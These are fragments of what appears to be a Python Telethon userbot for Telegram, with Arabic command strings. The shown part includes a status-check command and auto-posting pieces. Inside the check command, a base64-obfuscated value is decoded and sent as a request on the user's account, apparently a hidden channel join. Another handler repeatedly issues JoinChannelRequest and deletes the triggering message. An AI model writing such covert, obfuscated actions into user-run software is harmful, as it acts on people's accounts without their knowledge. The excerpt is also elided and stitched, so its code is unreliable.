...
async def Hussein(event):
    ...
    joinu = await ha313so(JoinChannelRequest(''))
    joinu = await ha313so(JoinChannelRequest(''))
    joinu = await ha313so(JoinChannelRequest(''))
    await event.delete()
...
===== ⒺⓂⓃⒺⓂ =====
    **"""
        await event.reply(file='https://telegra.ph/file/03a01c59168bf8546ec55.jpg', message=joker_313)
    elif event.pattern_match.group(1) == "فحص":
        hussein_ali = "**السورس يعمل بنجاح حبيبي ✅\nلعرض قائمة الاوامر أرسل `.الاوامر`**"
        await event.reply(file='https://telegra.ph/file/03a01c59168bf8546ec55.jpg', message=hussein_ali)
        joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
        joker = Get(joker)
        try:
            await event.client(joker)
            ...
            pass
print('تم تشغيل نشر التلقائي لسورس emnem')
